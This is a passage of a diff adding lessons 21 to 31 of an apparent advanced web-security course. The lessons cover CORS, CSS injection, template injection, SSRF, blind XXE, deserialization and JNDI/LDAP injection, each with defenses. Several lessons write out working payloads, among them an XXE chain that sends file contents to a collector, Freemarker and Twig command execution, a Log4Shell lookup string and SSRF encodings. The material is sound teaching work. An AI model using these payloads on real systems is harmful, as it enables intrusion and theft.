nonce observed in one response can be attached to injected script in another response that uses the same value."
+  },
+  {
+    "id": "web-security-advanced-21",
+    "topic": "web-security-advanced",
+    "number": 21,
+    "title": "postMessage Trust Boundaries and Frame Identity",
+    "level": "Advanced",
+    "minutes": 60,
+    "summary": "Analyze cross-origin messaging as two trust decisions: who may send to you and who may receive your secrets.",
+    "objectives": [
+      "Audit message listeners for origin validation",
+      "Exploit weak matching and frame identity checks",
+      "Restrict targetOrigin on sends"
+    ],
+    "takeaways": [
+      "Check event.origin exactly, never by substring",
+      "event.source alone is not identity",
+      "Never broadcast secrets with a wildcard target"
+    ],
+    "practice": "On a local page at <LAB_HOST>, add a harmless message listener with weak origin matching and deliver a payload from a second owned origin.",
+    "sources": [],
+    "content": "## Core idea\nThe `postMessage` API lets frames communicate across origins, which means it deliberately crosses a security boundary. Two decisions matter: which senders a listener trusts, and which receivers a sender trusts. A listener that validates `event.origin` with `includes`, `startsWith`, or a regex is vulnerable to lookalike origins such as `https://trusted.example.attacker.tld`. A sender that uses `targetOrigin: \"*\"` broadcasts any payload, including tokens, to whatever frame currently occupies the window reference.\n\nThe mental model is an inbox with a return address. The origin is the verified return address; the source window is merely the envelope, which can be reused by navigation. Checking only `event.source` is unsafe because an attacker can navigate that frame to their own content. Frame-counting races  -  where a listener trusts whichever index in `window.frames` it expects  -  are another variant. Data validation is a third layer: even from a trusted origin, the message shape must be validated before reaching a sink such as `innerHTML` or a navigation.\n\n### Step-by-step method (lab only)\n1. Search source at <LAB_HOST> for `addEventListener('message')` and `postMessage(` calls.\n2. For each listener, record the origin check: exact equality, regex, substring, or absent.\n3. Check whether `event.source` is validated against an expected window and whether navigation is possible.\n4. From an owned second origin, deliver crafted messages with a harmless marker and observe the handler's behavior.\n5. Inspect outbound posts for wildcard `targetOrigin` and verify whether sensitive data is included.\n\n### Concrete example\n```js\nwindow.addEventListener('message', (e) => {\n  if (e.origin.includes('https://trusted.example')) {\n    document.getElementById('view').innerHTML = e.data.html;\n  }\n});\n```\nAn attacker origin `https://trusted.example.attacker.test` passes `includes`, and the `html` field reaches an HTML sink. The fix requires `e.origin === 'https://trusted.example'` plus schema validation of `e.data`.\n\n| Check | Strength | Failure |\n|---|---|---|\n| Exact origin string | Strong | None |\n| Regex or substring | Weak | Lookalike domains |\n| Source window only | Weak | Frame navigation |\n| Wildcard target | None | Secret disclosure |\n\n### Bypass and defense pairs\n- Bypass: navigate the trusted frame to attacker content so `event.source` still matches. Defense: validate both origin and an unguessable channel identifier.\n- Bypass: send a message with an unexpected shape that triggers a sink. Defense: validate types and allowlist fields.\n\n### Common mistakes\n- Comparing origin case-insensitively or ignoring the port.\n- Trusting `event.origin` from sandbox frames with `null` origin.\n- Forgetting that message handlers can be registered by libraries.\n\n### Knowledge check\n**Q:** Why is `event.source` not a reliable identity check?\n**A:** Because a window reference can be navigated to a different origin; the source object stays the same while the content and trust change."
+  },
+  {
+    "id": "web-security-advanced-22",
+    "topic": "web-security-advanced",
+    "number": 22,
+    "title": "CORS and Credential Edge Cases",
+    "level": "Advanced",
+    "minutes": 60,
+    "summary": "Study how reflective origin policies, null origins, and cache interactions turn CORS into authenticated data disclosure.",
+    "objectives": [
+      "Test origin matching rules and credential combinations",
+      "Exploit null origin and suffix trust",
+      "Verify Vary and cache behavior"
+    ],
+    "takeaways": [
+      "CORS headers are a permission grant from the server",
+      "Reflecting Origin disables same-origin protection",
+      "Credentials require explicit origin allowlisting"
+    ],
+    "practice": "Against a local API at <LAB_HOST>, vary the Origin header and inspect Access-Control-Allow-Origin and Allow-Credentials responses.",
+    "sources": [],
+    "content": "## Core idea\nCORS is a browser-enforced boundary, but the permission statement comes from the server. If a server reflects the request's `Origin` into `Access-Control-Allow-Origin`, the browser treats attacker JavaScript as same-origin for that response. Edge cases include trusting the `null` origin used by sandboxed iframes and data URLs, suffix or regex origin matching, and missing `Vary: Origin` that lets a shared cache serve a response authorized for one origin to another.\n\nThe mental model is a server-signed pass. The browser will hand authenticated response data to any origin the server lists. Sensible defaults are an explicit origin allowlist, no wildcard when credentials are allowed, and `Vary: Origin` whenever the header varies. Preflight requests are another surface:permissive method or header allowances can enable state-changing cross-origin requests with credentials.\n\n### Step-by-step method (lab only)\n1. Send requests to <LAB_HOST> with `Origin` values: an allowed origin, a lookalike, a subdomain, `null`, and an arbitrary domain.\n2. Record `Access-Control-Allow-Origin`, `Access-Control-Allow-Credentials`, and `Vary`.\n3. Test whether `null` is accepted via a sandboxed iframe or data URL in your lab.\n4. Test preflight with `Access-Control-Request-Method: PUT` and custom headers.\n5. Check whether a response authorized for one origin is cached and served to another.\n\n### Concrete example\n```http\nGET /api/me HTTP/1.1\nHost: <LAB_HOST>\nOrigin: https://evil.example\nAuthorization: Bearer <TOKEN_A>\n\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: https://evil.example\nAccess-Control-Allow-Credentials: true\n```\nThe combination of reflective ACAO and credentials means any origin can read authenticated user data.\n\n| Pattern | Risk |\n|---|---|\n| `ACAO: *` with credentials | Invalid or exploitable depending on client |\n| Reflected Origin | Any origin reads data |\n| `null` trusted | Sandbox pages read data |\n| Missing `Vary: Origin` | Cross-origin cache mixing |\n\n### Bypass and defense pairs\n- Bypass: suffix matching that accepts `https://trusted.example.attacker.test`. Defense: exact string comparison against a static allowlist.\n- Bypass: `null` origin from a sandbox. Defense: never include `null` in allowed origins.\n\n### Common mistakes\n- Using regex origin matching without anchoring.\n- Assuming CORS protects against server-to-server requests; it only governs browsers.\n- Ignoring JSONP fallbacks that bypass CORS entirely.\n\n### Additional surface\nCredentialed requests with custom headers always trigger a preflight, so an overly permissive preflight policy is as dangerous as a reflective ACAO. Also examine subresource requests: a permissive policy on an API that returns tokens can be exploited from a page that the user visits, even if the main application lives on a different origin.\n\n### Knowledge check\n**Q:** Why must `Vary: Origin` be set when ACAO is dynamic?\n**A:** Otherwise a cache may store the response authorized for one origin and serve it to a different origin, leaking data."
+  },
+  {
+    "id": "web-security-advanced-23",
+    "topic": "web-security-advanced",
+    "number": 23,
+    "title": "CSS Injection and UI Redress Attacks",
+    "level": "Advanced",
+    "minutes": 60,
+    "summary": "Learn how attacker-controlled CSS queries the DOM and leaks secrets, and how overlays coerce unintended user interactions.",
+    "objectives": [
+      "Use attribute selectors to leak tokens",
+      "Build a safe clickjacking proof of concept",
+      "Apply frame and style defenses"
+    ],
+    "takeaways": [
+      "CSS can test DOM state and trigger network requests",
+      "Overlays can hijack clicks without breaking visuals",
+      "frame-ancestors is the real defense"
+    ],
+    "practice": "On a local page at <LAB_HOST>, inject a harmless attribute-selector rule that requests a marker URL when a secret prefix matches.",
+    "sources": [],
+    "content": "## Core idea\nCascading Style Sheets are a declarative query language over the DOM. If an attacker can inject CSS rules, they can test properties of elements and report the result through a network request. Attribute selectors such as `[value^=\"a\"]` let an attacker brute-force a CSRF token character by character: each guess that matches loads a background image from an attacker-controlled URL. This is CSS injection, and it turns read-only styling into an exfiltration channel.\n\nUI redress, or clickjacking, is the complementary problem: an invisible frame from the target is positioned under a decoy interface so the user's clicks land on sensitive controls. Modern variants use transparent overlays, drag-and-drop, pointer events, scroll position, and frame-busting bypasses. The mental model is that the browser composes visual layers while the security decision happens on the underlying element; what the user sees and what they click can differ.\n\n### Step-by-step method (lab only)\n1. Find a CSS reflection point at <LAB_HOST>, such as a theme or style parameter.\n2. Inject attribute selectors targeting a sensitive input value and a request to a marker URL on your owned collector.\n3. Confirm the leak by observing which guessed character triggers a request.\n4. For clickjacking, embed the target in a transparent iframe above a decoy button in your lab page.\n5. Check `frame-ancestors`, `X-Frame-Options`, and cookie `SameSite` settings.\n\n### Concrete example\n```css\ninput[name=\"csrf\"][value^=\"a\"] {\n  background-image: url(\"https://<LAB_HOST>/collect?guess=a\");\n}\n```\nRepeating for each character recovers the token without reading JavaScript variables. A clickjacking overlay:\n```html\n<iframe src=\"https://<LAB_HOST>/transfer\" style=\"opacity:0;position:absolute\"></iframe>\n```\n\n| Technique | Capability |\n|---|---|\n| Attribute selector | Test secret value |\n| `url()` request | Exfiltrate match |\n| Transparent iframe | Coerce clicks |\n| Drag-and-drop | Read cross-frame text |\n\n### Bypass and defense pairs\n- Bypass: frame-busting JavaScript disabled by sandbox attributes. Defense: `Content-Security-Policy: frame-ancestors 'none'`.\n- Bypass: injected style in an `style` attribute. Defense: strict `style-src` and output encoding.\n\n### Common mistakes\n- Treating CSS as harmless because it cannot execute scripts.\n- Relying on `X-Frame-Options` alone when `frame-ancestors` is available.\n- Forgetting that `SameSite=Lax` blocks many but not all clickjacking flows.\n\n### Additional surface\nCSS injection often begins in an unexpected place: a user-supplied color, font name, or theme parameter inserted into a style block. Even a single injectable declaration is enough to add an import or a url rule. Test both inline styles and stylesheet endpoints, and check whether sanitizers allow semicolons that terminate a declaration.\n\n### Knowledge check\n**Q:** Why can a CSS rule leak a token without JavaScript?\n**A:** Because a matching selector triggers a URL request, converting a boolean DOM test into an observable network signal."
+  },
+  {
+    "id": "web-security-advanced-24",
+    "topic": "web-security-advanced",
+    "number": 24,
+    "title": "Client-Side Template Injection and Framework Escapes",
+    "level": "Advanced",
+    "minutes": 60,
+    "summary": "Explore expression evaluation in client-side frameworks and how template compilation becomes code execution.",
+    "objectives": [
+      "Detect template compilation of user input",
+      "Escape sandboxes with harmless markers",
+      "Enforce framework-safe rendering"
+    ],
+    "takeaways": [
+      "A template is code, not data",
+      "Expression languages expose object graphs",
+      "Framework sandboxes are not security boundaries"
+    ],
+    "practice": "In a local SPA at <LAB_HOST>, submit a harmless arithmetic template payload and confirm whether the framework evaluates it.",
+    "sources": [],
+    "content": "## Core idea\nClient-side template engines compile strings into executable expressions. If user-controlled input reaches the compiler, an attacker can evaluate arbitrary expressions in the page's context. Detection usually starts with arithmetic: `{{7*7}}` rendering as `49` indicates evaluation. From there, engine-specific object traversal can reach constructors and, in some frameworks, sandbox escapes that yield script execution. The mental model is that template compilation is a form of `eval`; the \"template language\" is a restricted programming language whose restrictions are often bypassable.\n\nDifferent engines expose different surfaces. Angular expressions historically allowed constructor-chain escapes; Vue templates can invoke methods; Handlebars and Mustache expose helpers and prototype properties; React's `dangerouslySetInnerHTML` and Vue's `v-html` are explicit escape hatches into raw HTML. Server-side vs client-side compilation also matters: a string safely escaped on the server can still be compiled into a template on the client.\n\n### Step-by-step method (lab only)\n1. Identify the framework and version from response headers, bundles, or error pages at <LAB_HOST>.\n2. Submit detection payloads such as `{{7*7}}`, `${7*7}`, and framework-specific syntax.\n3. Escalate with object traversal using a harmless marker rather than a destructive payload.\n4. Test escape hatches such as raw HTML bindings and trusted-by-default helpers.\n5. Verify that ordinary user content is rendered through the framework's automatic escaping path.\n\n### Concrete example\n```js\nconst template = Handlebars.compile(location.hash.slice(1));\ndocument.body.innerHTML = template({});\n```\nA payload such as `{{constructor.constructor('return 1')()}}` demonstrates expression reach. Angular-style probes like `{{'a'.constructor.prototype}}` probe the object graph.\n\n| Engine | Probe | Escape hatch |\n|---|---|---|\n| Angular | `{{7*7}}` | Constructor chains |\n| Vue | `{{7*7}}` | `v-html` |\n| Handlebars | `{{7*7}}` | Helpers, prototype |\n| React | Not templated | `dangerouslySetInnerHTML` |\n\n### Bypass and defense pairs\n- Bypass: hash or query value passed directly to `compile()`. Defense: never compile user strings; use static templates with data bindings.\n- Bypass: helper that writes raw HTML. Defense: allowlist helpers and escape by default.\n\n### Common mistakes\n- Assuming server-side output encoding protects client-side compilation.\n- Using outdated framework versions with known sandbox escapes.\n- Confusing template injection with plain reflected XSS; the remediation differs.\n\n### Additional surface\nDo not overlook template fragments loaded asynchronously. A client route that fetches a template string from a server and compiles it locally creates the same risk as direct input. Version pinning matters because framework maintainers regularly patch sandbox escapes; an outdated bundle can turn otherwise safe data bindings into an evaluation primitive.\n\n### Knowledge check\n**Q:** Why does `{{7*7}}` evaluating to `49` prove more than a reflected XSS marker?\n**A:** It proves the framework compiled the input as a template, exposing an expression language rather than passive markup."
+  },
+  {
+    "id": "web-security-advanced-25",
+    "topic": "web-security-advanced",
+    "number": 25,
+    "title": "SSRF Filter Bypass Taxonomy",
+    "level": "Advanced",
+    "minutes": 75,
+    "summary": "Organize SSRF bypasses by parser differentials, alternative encodings, redirect chains, and protocol smuggling.",
+    "objectives": [
+      "Classify SSRF bypass techniques systematically",
+      "Test parser and DNS differentials",
+      "Build an allowlist-based defense"
+    ],
+    "takeaways": [
+      "Filters and HTTP clients parse URLs differently",
+      "Internal addresses have many encodings",
+      "Redirects and alternate schemes defeat naive blocks"
+    ],
+    "practice": "Against a local fetch endpoint at <LAB_HOST>, test decimal, octal, and IPv6 encodings of loopback plus an owned redirect chain.",
+    "sources": [],
+    "content": "## Core idea\nServer-side request forgery filters usually deny a list of literal strings such as `127.0.0.1`, `localhost`, and the cloud metadata address. The bypass surface is enormous because the filter parses the URL with one parser while the HTTP client uses another. The mental model is a classification tree: encoding variants, DNS tricks, parser differentials, redirect chains, and protocol substitutions. Each class attacks a different assumption in the filter.\n\nEncoding variants express the same IP as decimal, octal, hex, or IPv6-mapped forms. DNS tricks include rebinding, where an owned hostname resolves to a public IP during validation and to a private IP during the actual fetch, and wildcard DNS that resolves any subdomain. Parser differentials exploit differences in how `@`, `#`, backslashes, encoded slashes, and userinfo are handled. Redirect chains let a public URL bounce to an internal target after validation. Alternate schemes such as `gopher`, `dict`, and `file` turn a fetch into arbitrary protocol interaction.\n\n### Step-by-step method (lab only)\n1. Identify the fetch capability at <LAB_HOST> and the observable signal: response body, error text, or timing.\n2. Test direct loopback and metadata addresses, then decimal, octal, hex, and IPv6 forms.\n3. Use an owned domain with DNS rebinding to separate validation time from fetch time.\n4. Test parser differentials with userinfo and fragment tricks.\n5. Test a redirect chain from an owned public URL to an internal target.\n\n### Concrete example\n```text\nhttp://2130706433/              decimal 127.0.0.1\nhttp://0177.0.0.1/              octal form\nhttp://[::ffff:127.0.0.1]/      IPv6-mapped\nhttp://public.example@127.0.0.1/\n```\nThe last form is parsed as host `127.0.0.1` by many clients while a naive filter reads the substring before `@`.\n\n| Class | Example | Filter assumption |\n|---|---|---|\n| Encoding | Decimal IP | Literal string match |\n| DNS | Rebinding | Host resolved once |\n| Parser | Userinfo confusion | Same parser both sides |\n| Protocol | gopher:// | Only HTTP is fetched |\n\n### Bypass and defense pairs\n- Bypass: redirect to internal address after validation. Defense: disable redirects or revalidate each hop.\n- Bypass: gopher protocol against internal TCP services. Defense: allowlist schemes to HTTP(S) only.\n\n### Common mistakes\n- Blocklisting hostnames without resolving to IPs.\n- Validating DNS once but fetching later with a fresh lookup.\n- Ignoring non-HTTP schemes entirely.\n\n### Knowledge check\n**Q:** Why is an IP allowlist stronger than a private-range blocklist?\n**A:** Because the allowlist admits only explicitly approved destinations, so encoding tricks and unknown internal ranges cannot be reached."
+  },
+  {
+    "id": "web-security-advanced-26",
+    "topic": "web-security-advanced",
+    "number": 26,
+    "title": "Blind XXE and Out-of-Band Exfiltration",
+    "level": "Advanced",
+    "minutes": 75,
+    "summary": "Learn how parameter entities turn an XML parser into an out-of-band file-read primitive when errors are not reflected.",
+    "objectives": [
+      "Detect blind XML parsing safely",
+      "Build parameter-entity exfiltration chains",
+      "Disable external entity resolution"
+    ],
+    "takeaways": [
+      "Parameter entities can declare other entities",
+      "OOB channels carry stolen data in URLs",
+      "Local DTD tricks work when external DTDs are blocked"
+    ],
+    "practice": "In a local XML endpoint at <LAB_HOST>, send a harmless external entity that calls back to an owned collector to confirm parsing.",
+    "sources": [],
+    "content": "## Core idea\nWhen an application parses attacker-supplied XML, external entity resolution can read local files or make network requests. Blind XXE is the case where the application does not reflect results, so the attacker must exfiltrate data through an out-of-band channel. Parameter entities are the key mechanism: an entity declared with `%` can be used inside a DTD to construct another declaration whose value embeds a file's content into a URL sent to an owned collector.\n\nThe mental model is a request generator. The parser resolves an external DTD from your server; that DTD defines a parameter entity that reads a local file; the file content is substituted into a URL; the parser fetches that URL, leaking the data. When external DTDs are blocked, local DTD files present on the target system can sometimes be abused to achieve the same indirection. Error-based variants place the file content into a malformed URI so the parser's error message carries it, useful when outbound network is restricted.\n\n### Step-by-step method (lab only)\n1. Detect XML parsing at <LAB_HOST> by comparing responses to well-formed and malformed input.\n2. Send a harmless external entity that references a URL on an owned collector and watch for the callback.\n3. Introduce parameter entities to read a non-sensitive local file in your lab.\n4. Try `file://`, `netdoc://`, and error-based channels when direct HTTP fails.\n5. Test local DTD indirection if external DTD loading is blocked.\n\n### Concrete example\n```xml\n<!DOCTYPE root [\n  <!ENTITY % file SYSTEM \"file:///etc/hostname\">\n  <!ENTITY % xxe SYSTEM \"http://<LAB_HOST>/collect?d=%file;\">\n  %xxe;\n]>\n<root/>\n```\nThe callback URL contains the file contents. A harmless marker file makes verification safe.\n\n| Channel | When useful |\n|---|---|\n| HTTP callback | Outbound HTTP allowed |\n| FTP / gopher | Protocol parsing quirks |\n| Error message | No outbound network |\n| Local DTD | External DTD blocked |\n\n### Bypass and defense pairs\n- Bypass: blocklist of `file://` but not `netdoc://`. Defense: disable DTDs and external entities entirely in the parser configuration.\n- Bypass: tolerant parser that resolves entities despite a deny rule. Defense: use a hardened parser and validate input against a strict schema.\n\n### Common mistakes\n- Assuming \"blind\" means unexploitable.\n- Forgetting that entity expansion can also cause denial of service.\n- Testing with real third-party collectors instead of an owned lab host.\n\n### Knowledge check\n**Q:** Why are parameter entities needed for blind XXE?\n**A:** Because they let an attacker build a nested declaration inside a DTD, embedding file content into a URL that the parser fetches to an attacker-controlled collector."
+  },
+  {
+    "id": "web-security-advanced-27",
+    "topic": "web-security-advanced",
+    "number": 27,
+    "title": "Server-Side Template Injection in Jinja and Twig",
+    "level": "Advanced",
+    "minutes": 75,
+    "summary": "Trace SSTI from arithmetic detection through object-graph traversal to controlled code execution in Python and PHP engines.",
+    "objectives": [
+      "Detect engine type from probes and errors",
+      "Traverse object graphs safely in a lab",
+      "Apply sandbox and compilation defenses"
+    ],
+    "takeaways": [
+      "Template expressions are a programming language",
+      "Introspection leads to dangerous classes",
+      "Autoescaping does not stop expression evaluation"
+    ],
+    "practice": "In a local Jinja2 app at <LAB_HOST>, confirm `{{7*7}}` evaluation and enumerate a harmless attribute to map the object graph.",
+    "sources": [],
+    "content": "## Core idea\nServer-side template injection occurs when untrusted input is concatenated into a template that the server compiles. The template expression language is a restricted but surprisingly capable programming language. Detection starts with arithmetic; escalation uses introspection to walk from a harmless literal to classes and functions. Autoescaping protects markup output but does nothing to prevent expression evaluation, which is why SSTI often escalates to remote code execution.\n\nThe mental model is a capability ladder. Level one is arithmetic confirmation. Level two is access to globals and configuration objects. Level three is object-graph traversal through `__class__`, `__mro__`, and `__subclasses__` in Python, or `_self.env` in Twig. Level four is invoking a callable that performs an action. Each rung reveals more of the runtime, and the final payload depends on which classes the application loaded.\n\n### Step-by-step method (lab only)\n1. Submit detection probes and identify the engine from syntax and error messages at <LAB_HOST>.\n2. Read configuration and global objects to learn the environment.\n3. Traverse the object graph using harmless introspection.\n4. Locate a callable suitable for a marker action in your lab.\n5. Verify the chain, then fix by removing user-controlled template compilation.\n\n### Concrete example\n```text\n{{7*7}}\n{{ config.items() }}\n{{ ''.__class__.__mro__[1].__subclasses__() }}\n```\nIn Twig, a classic probe is:\n```text\n{{_self.env.registerUndefinedFilterCallback(\"id\")}}{{_self.env.getFilter(\"x\")}}\n```\nUse only harmless commands on your own lab.\n\n| Engine | Detection | Escalation surface |\n|---|---|---|\n| Jinja2 | `{{7*7}}` | `__subclasses__`, globals |\n| Twig | `{{7*7}}` | `_self.env` |\n| Mako | `${7*7}` | Python expressions |\n\n### Bypass and defense pairs\n- Bypass: sandbox filters that block `__class__` but allow attribute chains. Defense: never compile user templates; use fixed templates with data.\n- Bypass: filters that block common function names. Defense: run the template engine in a restricted process with minimal privileges.\n\n### Common mistakes\n- Confusing template injection with simple markup injection.\n- Stopping at `{{7*7}}` without assessing escalation impact.\n- Assuming a sandbox is a complete security boundary.\n\n### Additional surface\nEngine version strongly influences which introspection paths exist, so record the exact version from error pages or dependency manifests. Some deployments run the engine with a security manager or restricted globals; test what remains reachable rather than assuming a public payload will work. Always escalate with harmless markers in your own lab.\n\n### Knowledge check\n**Q:** Why does autoescaping not prevent SSTI?\n**A:** Because escaping applies to rendered output, while the injected expression is evaluated during compilation before any output encoding occurs."
+  },
+  {
+    "id": "web-security-advanced-28",
+    "topic": "web-security-advanced",
+    "number": 28,
+    "title": "SSTI in Java Template Engines",
+    "level": "Advanced",
+    "minutes": 75,
+    "summary": "Examine Freemarker, Velocity, and Thymeleaf expression features that enable code execution when templates are attacker-controlled.",
+    "objectives": [
+      "Detect Java template engines from syntax and errors",
+      "Use built-in reflection utilities safely in a lab",
+      "Harden template configuration"
+    ],
+    "takeaways": [
+      "Java engines ship powerful reflective utilities",
+      "Preprocessing syntax creates a second evaluation stage",
+      "Sandbox modes reduce but do not remove risk"
+    ],
+    "practice": "In a local Freemarker endpoint at <LAB_HOST>, render a harmless template probe and confirm whether built-in utility instantiation is available.",
+    "sources": [],
+    "content": "## Core idea\nJava template engines are designed for flexibility, and that flexibility becomes dangerous when user input is compiled as a template. Freemarker exposes a `?new()` operator that can instantiate classes available to the template, including a utility class that executes operating-system commands. Velocity allows method calls and object property access from templates. Thymeleaf supports preprocessing with `__${...}__` that creates a second evaluation pass, turning seemingly escaped input into executable expressions.\n\nThe mental model is a capability menu provided by the engine. Unlike Python engines where you assemble a chain from runtime internals, Java engines often hand you a direct utility. Detection still starts with arithmetic probes, but the error messages are distinctive: Freemarker reports invalid references, Velocity reports parsing exceptions, and Thymeleaf reveals SpEL errors. Once the engine is known, the available built-ins determine the payload.\n\n### Step-by-step method (lab only)\n1. Submit engine-specific probes to <LAB_HOST> and classify the engine from responses.\n2. Determine whether the engine runs in a restricted or unrestricted configuration.\n3. Enumerate built-in utilities that can instantiate or invoke classes.\n4. Use a harmless marker command in your own lab to confirm execution.\n5. Test Thymeleaf preprocessing by nesting expressions inside a reflected parameter.\n\n### Concrete example\n```text\n<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}\n```\nFor Thymeleaf preprocessing:\n```text\n__${7*7}__\n```\nIf the result is `49`, the preprocessing stage is active and a second evaluation occurs.\n\n| Engine | Probe | Powerful feature |\n|---|---|---|\n| Freemarker | `${7*7}` | `?new()` instantiation |\n| Velocity | `#set($x=7*7)` | Method invocation |\n| Thymeleaf | `__${7*7}__` | Preprocessing |\n\n### Bypass and defense pairs\n- Bypass: class allowlists that still permit a utility class. Defense: never compile user-supplied templates; use fixed templates with model data.\n- Bypass: preprocessing that re-evaluates escaped text. Defense: disable preprocessing and avoid reflecting input into templates.\n\n### Common mistakes\n- Treating engine sandbox mode as a complete control.\n- Ignoring preprocessing as a separate evaluation stage.\n- Testing payloads from public write-ups without adapting to the lab environment.\n\n### Additional surface\nTemplate configuration matters as much as version. A restricted Freemarker configuration removes object instantiation, while an unrestricted one leaves the new-operator available. Thymeleaf preprocessing can be disabled, and framework integrations may expose expression objects that widen the attack surface. Record which mode the lab application uses.\n\n### Knowledge check\n**Q:** Why is Freemarker's `?new()` especially dangerous?\n**A:** Because it allows template code to instantiate arbitrary classes on the classpath, including utilities that execute commands."
+  },
+  {
+    "id": "web-security-advanced-29",
+    "topic": "web-security-advanced",
+    "number": 29,
+    "title": "Java Deserialization Gadget Chains",
+    "level": "Advanced",
+    "minutes": 90,
+    "summary": "Understand how native Java deserialization turns byte streams into object graphs whose readObject methods form execution chains.",
+    "objectives": [
+      "Recognize serialized Java artifacts",
+      "Map a gadget chain from source to sink",
+      "Enforce deserialization filters"
+    ],
+    "takeaways": [
+      "Deserialization invokes attacker-controlled code paths by design",
+      "Gadget chains reuse classes already on the classpath",
+      "Filters are the primary mitigation"
+    ],
+    "practice": "In a local Java service at <LAB_HOST>, submit a Base64-encoded serialized object and observe a harmless marker effect in your own lab.",
+    "sources": [],
+    "content": "## Core idea\nJava native deserialization reconstructs objects from a byte stream and calls their `readObject` methods. If the stream is attacker-controlled, the classes chosen by the attacker determine which code runs during reconstruction. A gadget chain is a program assembled from existing classes: each class's deserialization callback triggers a method on another object, ending in a dangerous sink such as command execution or JNDI lookup. Libraries such as CommonsCollections and BeanShell have historically supplied the needed classes.\n\nThe mental model is a domino chain where each domino is a class already present on the classpath. The serialized stream sets the initial domino and the values it carries. Some chains rely on secondary lookups, such as a JNDI reference fetched during deserialization, which connects this topic to remote class loading. Because the chain depends on library versions, identifying the classpath from error messages is a core skill.\n\n### Step-by-step method (lab only)\n1. Detect serialized Java data at <LAB_HOST> by looking for the stream magic bytes or Base64-wrapped equivalents.\n2. Trigger controlled errors to enumerate class names and library versions.\n3. Match available libraries to known chain structures.\n4. Generate a harmless marker payload in your own lab environment.\n5. Verify the effect, then implement a deserialization filter that allows only expected classes.\n\n### Concrete example\n```text\nAC ED 00 05 73 72 00 ...   (serialized Java stream)\n```\nA Base64-wrapped equivalent is common in HTTP headers and cookies. Chains are typically described by their entry class and trigger class; for example, a transform map whose lazy evaluation calls a command transformer.\n\n| Chain component | Role |\n|---|---|\n| Entry object | Starts callbacks |\n| Transformer | Holds action |\n| Trigger map | Invokes action |\n| Sink | Executes effect |\n\n### Bypass and defense pairs\n- Bypass: filter that allows a broad package containing a gadget class. Defense: allowlist exact classes required by the application.\n- Bypass: primitive chains using only JDK classes. Defense: keep JDK patched and apply JEP 290 filters globally.\n\n### Common mistakes\n- Assuming blocking one library eliminates the issue.\n- Ignoring secondary vectors such as JNDI or RMI during deserialization.\n- Using destructive payloads instead of harmless markers in a lab.\n\n### Knowledge check\n**Q:** Why do gadget chains work without uploading any code?\n**A:** Because they reuse classes already loaded by the application, arranging existing callbacks into a program."
+  },
+  {
+    "id": "web-security-advanced-30",
+    "topic": "web-security-advanced",
+    "number": 30,
+    "title": "JNDI and LDAP Injection Edge Cases",
+    "level": "Advanced",
+    "minutes": 75,
+    "summary": "Study attacker-controlled lookup names that retrieve remote objects, plus filter injection in LDAP queries.",
+    "objectives": [
+      "Identify JNDI lookup sinks in loggers and configuration",
+      "Build a harmless callback proof",
+      "Escape LDAP filter metacharacters"
+    ],
+    "takeaways": [
+      "A lookup name is an instruction to fetch an object",
+      "LDAP references can point to remote codebases",
+      "Filter syntax injection broadens queries"
+    ],
+    "practice": "In a local app at <LAB_HOST>, send a harmless JNDI marker in a header and observe a callback to an owned LDAP listener.",
+    "sources": [],
+    "content": "## Core idea\nJNDI is a naming and directory API: given a name, it returns an object. When the name is attacker-controlled, the lookup becomes a request to a directory service. LDAP and RMI providers can return a `Reference` that instructs the client to load a class from a remote codebase, which is the mechanism behind the well-known Log4Shell vulnerability. Even without code loading, the lookup itself is an SSRF-like primitive against internal directory services.\n\nLDAP injection is a separate but related class. LDAP filters use a prefix notation with parentheses and operators; unescaped user input can close a filter and append a new condition, broadening search results or bypassing authentication checks. DN injection manipulates distinguished names with commas and escapes. The mental model is that query syntax is part of the input language; if user data is concatenated into that language, it becomes instructions.\n\n### Step-by-step method (lab only)\n1. Identify sinks at <LAB_HOST> that pass user input to loggers, message formats, or directory lookups.\n2. Send a harmless marker such as `${jndi:ldap://<LAB_HOST>/probe}` in a header and watch an owned listener.\n3. Use a controlled LDAP server to observe which attributes and references are requested.\n4. For LDAP filters, inject characters like `)(&` and `|` and compare result sets.\n5. Test DN fields with comma and escape injection.\n\n### Concrete example\n```http\nUser-Agent: ${jndi:ldap://<LAB_HOST>/probe}\n```\nA vulnerable logger performs a lookup and connects to your listener. For a filter:\n```text\n(&(uid=<INPUT>)(objectClass=person))\n```\nInput of `*)(uid=*))(|(uid=*` turns the query into a wildcard match.\n\n| Surface | Input | Effect |\n|---|---|---|\n| JNDI name | `ldap://` | Remote lookup |\n| LDAP filter | `)(` | Query broadening |\n| DN | `,` | Attribute injection |\n\n### Bypass and defense pairs\n- Bypass: nested lookup syntax that evades a simple string filter. Defense: disable message lookups and upgrade affected libraries.\n- Bypass: filter metacharacters encoded differently by the client. Defense: escape LDAP special characters using a vetted encoder.\n\n### Common mistakes\n- Assuming only servlet containers are affected; many libraries perform lookups.\n- Ignoring outbound connections to internal directory services.\n- Testing against systems outside your owned lab.\n\n### Additional surface\nRemember that JNDI lookups are not the only risk from directory interactions. An application that binds or modifies directory entries may be vulnerable to attribute injection, where attacker-controlled values alter group membership or access flags. Test write paths with harmless marker attributes in your own lab.\n\n### Knowledge check\n**Q:** Why can an LDAP response lead to code execution?\n**A:** Because a directory can return a Reference with a remote codebase URL; the JNDI client may load and instantiate that class."
+  },
+  {
+    "id": "web-security-advanced-31",
+    "topic": "web-security-advanced",
+    "number": 31,
+    "title": "Template Injection in Modern Stacks",
+    "level": "Advanced",
+    "minutes": 60,
+    "summary": "Compare Go templates, Handlebars, and Mustache behavior when user input reaches template compilation.",
+    "objectives": [
+      "Distinguish autoescaping from expression evaluation",
+      "Detect modern-template injection",
+      "Restrict template functions"
+    ],
+    "takeaways": [
+      "html/template and text/template differ sharply",
+      "Helpers and partials are execution surfaces",
+      "Autoescaping does not block evaluation"
+    ],
+    "practice": "In a local Go service at <LAB_HOST>, submit a harmless arithmetic probe to see whether input is compiled as a template.",
+    "sources": [],
